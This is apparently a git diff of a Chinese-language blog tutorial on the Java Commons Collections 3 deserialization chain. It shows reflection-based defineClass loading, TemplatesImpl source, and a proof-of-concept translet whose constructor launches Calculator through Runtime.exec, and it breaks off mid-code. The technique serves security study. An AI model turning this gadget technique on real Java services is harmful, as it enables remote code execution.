@@ -477,33 +477,187 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="java反序列化CommonCollections3"><a href="#java反序列化CommonCollections3" class="headerlink" title="java反序列化CommonCollections3"></a>java反序列化CommonCollections3</h1><h2 id="TemplatesImpl动态加载字节码"><a href="#TemplatesImpl动态加载字节码" class="headerlink" title="TemplatesImpl动态加载字节码"></a>TemplatesImpl动态加载字节码</h2><p>之前我们说过了jvm类加载器的一些知识，我们知道java类加载过程中会调用三个方法，loadClass、findClass、defineClass。在findClass读取到字节码之后，会交由defineClass方法处理，将其转换为CLass对象存储在方法区中。我们尝试编写代码用defineClass直接加载字节码。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, NotFoundException, IOException, CannotCompileException, InstantiationException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">test</span> <span class="operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),code,<span class="number">0</span>,code.length);</span><br><span class="line">        test.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.Base64;
+
+import javassist.CannotCompileException;
+import javassist.NotFoundException;
+
+public class Test1 &#123;
+    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, NotFoundException, IOException, CannotCompileException, InstantiationException &#123;
+        Method defineClass &#x3D; ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
+        defineClass.setAccessible(true);
+        byte[] code &#x3D; Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE&#x3D;&quot;);
+        Class test &#x3D; (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),code,0,code.length);
+        test.newInstance();
+    &#125;
+&#125;
+</code></pre>
 
 <p>最后结果为</p>
 <p>![截屏2022-02-22 下午3.53.23](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-02-22 下午3.53.23.png)</p>
 <p>这里的输出是被我们写在test的构造函数中的。defineClass并不能帮我们new对象，所以如果想要执行任意代码，在调用defineClass之后，还要想办法调用构造函数。</p>
 <p>同时这里也看到了defineClass是一个保护属性，不能直接调用。我们无法在外部直接访问，只能用反射的形式调用。而在实际应用场景中，defineClass的作用域是不开放的，我们很难直接利用到它。</p>
 <p>虽然我们很难直接用到defineClass，但是java底层还是有有一些类调用到了它，这就是TemplatesImpl。com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中定义了一个内部类TransletClassLoader。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">         TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">             <span class="built_in">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">            <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">            <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">                ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">                ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">static final class TransletClassLoader extends ClassLoader &#123;
+        private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;
+
+         TransletClassLoader(ClassLoader parent) &#123;
+             super(parent);
+            _loadedExternalExtensionFunctions &#x3D; null;
+        &#125;
+
+        TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;
+            super(parent);
+            _loadedExternalExtensionFunctions &#x3D; mapEF;
+        &#125;
+
+        public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;
+            Class&lt;?&gt; ret &#x3D; null;
+            &#x2F;&#x2F; The _loadedExternalExtensionFunctions will be empty when the
+            &#x2F;&#x2F; SecurityManager is not set and the FSP is turned off
+            if (_loadedExternalExtensionFunctions !&#x3D; null) &#123;
+                ret &#x3D; _loadedExternalExtensionFunctions.get(name);
+            &#125;
+            if (ret &#x3D;&#x3D; null) &#123;
+                ret &#x3D; super.loadClass(name);
+            &#125;
+            return ret;
+         &#125;
+
+        &#x2F;**
+         * Access to final protected superclass member from outer class.
+         *&#x2F;
+        Class defineClass(final byte[] b) &#123;
+            return defineClass(null, b, 0, b.length);
+        &#125;
+    &#125;</code></pre>
 
 <p>我们可以看到这里重写了defineClass，而且这里并没有显示地声明其作用域，在这种情况下，其作用域就是default。也就是说defineClass的由其父类的protect变成了default，可以被外部调用。<strong>不过需要注意的是，这个字节码对应的类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类</strong>。具体原因我们后面会提到。</p>
 <p>接下来我们追溯一下TemplatesImpl#defineClass的调用链：</p>
 <p>TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt;TemplatesImpl#defineTransletClasses() -&gt;TemplatesImpl#defineClass()</p>
 <p>这里分析一下源码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">private void defineTransletClasses()
+        throws TransformerConfigurationException &#123;
+
+        if (_bytecodes &#x3D;&#x3D; null) &#123;
+            ErrorMsg err &#x3D; new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
+            throw new TransformerConfigurationException(err.toString());
+        &#125;
+
+        TransletClassLoader loader &#x3D; (TransletClassLoader)
+            AccessController.doPrivileged(new PrivilegedAction() &#123;
+                public Object run() &#123;
+                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
+                &#125;
+            &#125;);
+
+        try &#123;
+            final int classCount &#x3D; _bytecodes.length;
+            _class &#x3D; new Class[classCount];
+
+            if (classCount &gt; 1) &#123;
+                _auxClasses &#x3D; new HashMap&lt;&gt;();
+            &#125;
+
+            for (int i &#x3D; 0; i &lt; classCount; i++) &#123;
+                _class[i] &#x3D; loader.defineClass(_bytecodes[i]);
+                final Class superClass &#x3D; _class[i].getSuperclass();
+
+                &#x2F;&#x2F; Check if this is the main class
+                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;
+                    _transletIndex &#x3D; i;
+                &#125;
+                else &#123;
+                    _auxClasses.put(_class[i].getName(), _class[i]);
+                &#125;
+            &#125;
+
+            if (_transletIndex &lt; 0) &#123;
+                ErrorMsg err&#x3D; new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
+                throw new TransformerConfigurationException(err.toString());
+            &#125;
+        &#125;
+        catch (ClassFormatError e) &#123;
+            ErrorMsg err &#x3D; new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        &#125;
+        catch (LinkageError e) &#123;
+            ErrorMsg err &#x3D; new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        &#125;
+    &#125;</code></pre>
 
 <p>这里的loader就是一个之前提到的内部类TransletClassLoader，它调用了defineClass方法去加载_bytecodes[]中的字节码，并将结果返回给了__class[] ,这两个数组都是TemplatesImpl的成员变量。然后我们看到那行注释下面的那个if语句，大概意思是如果_bytecodes[]中的字节码所对应的类的父类是ABSTRACT_TRANSLET的话，就让_transletIndex等于数组的下标。乍一看并我们不懂这里有什么含义。而且之前我们说过deifneClass被调用时，类对象并不会初始化，我们需要显式地调用其构造函数才能实现任意代码执，这里虽然调用了defineClass，但并未调用类的构造函数。带着这些疑问，我们看一下调用了这个defineTransletClasses方法的getTransletInstance方法：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">            translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">private Translet getTransletInstance()
+        throws TransformerConfigurationException &#123;
+        try &#123;
+            if (_name &#x3D;&#x3D; null) return null;
+
+            if (_class &#x3D;&#x3D; null) defineTransletClasses();
+
+            &#x2F;&#x2F; The translet needs to keep a reference to all its auxiliary
+            &#x2F;&#x2F; class to prevent the GC from collecting them
+            AbstractTranslet translet &#x3D; (AbstractTranslet) _class[_transletIndex].newInstance();
+            translet.postInitialization();
+            translet.setTemplates(this);
+            translet.setOverrideDefaultParser(_overrideDefaultParser);
+            translet.setAllowedProtocols(_accessExternalStylesheet);
+            if (_auxClasses !&#x3D; null) &#123;
+                translet.setAuxiliaryClasses(_auxClasses);
+            &#125;
+
+            return translet;
+        &#125;
+        catch (InstantiationException e) &#123;
+            ErrorMsg err &#x3D; new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        &#125;
+        catch (IllegalAccessException e) &#123;
+            ErrorMsg err &#x3D; new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        &#125;
+    &#125;</code></pre>
 
 <p>在这里我们可以看到这样一句：AbstractTranslet translet &#x3D; (AbstractTranslet) _class[_transletIndex].newInstance();</p>
 <p>这里的transletIndex就是之前那个if语句中的transletIndex，也就是说，这里会实例化一个AbstractTranslet对象，而这个对象对应的类就是从之前调用defineClass返回的类对象。到这里一切就明了了。为了让实例化出来的对象是AbstractTranslet类型的，之前的那个if条件就是判断返回的类对象的父类是不是AbstractTranslet，如果是的话，程序运行到这里时就会将其实例化。这也解释了我们之前说过的define加载的字节码对应的类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">        <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">private static String ABSTRACT_TRANSLET
+        &#x3D; &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</code></pre>
 
 <p>到这里，我们似乎就可以用TemplatesImpl动态加载字节码的方式来执行任意代码了。我们尝试用这个方法构造一个简单的POC,首先我们创建一个用来执行任意代码的类：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cal</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Cal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public class Cal extends AbstractTranslet &#123;
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125;
+
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;&#125;
+
+    public Cal() throws Exception &#123;
+        super();
+        Runtime.getRuntime().exec(&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;);
+    &#125;</code></pre>
 
 <p>然后用创建TemplatesImpl动态加载Cal的字节码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> 